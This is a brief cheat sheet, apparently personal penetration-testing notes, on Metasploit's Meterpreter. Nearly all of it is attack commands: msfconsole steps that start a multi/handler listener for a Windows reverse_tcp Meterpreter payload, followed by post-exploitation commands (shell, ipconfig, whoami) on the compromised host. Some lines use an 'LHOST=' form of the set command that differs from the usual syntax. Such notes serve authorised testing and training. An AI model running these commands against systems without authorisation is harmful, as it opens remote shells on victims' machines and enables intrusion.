# Meterpreter

MSF Framework :
---
Setup
```
msfconsole -q
use exploit/multi/handler
set payload windows/x86/meterpreter/reverse_tcp
set LHOST=192.168.0.X
set LPORT=4444
set RHOST=192.168.0.Y
exploit
```
Command :
```
shell
ipconfig
whoami
```
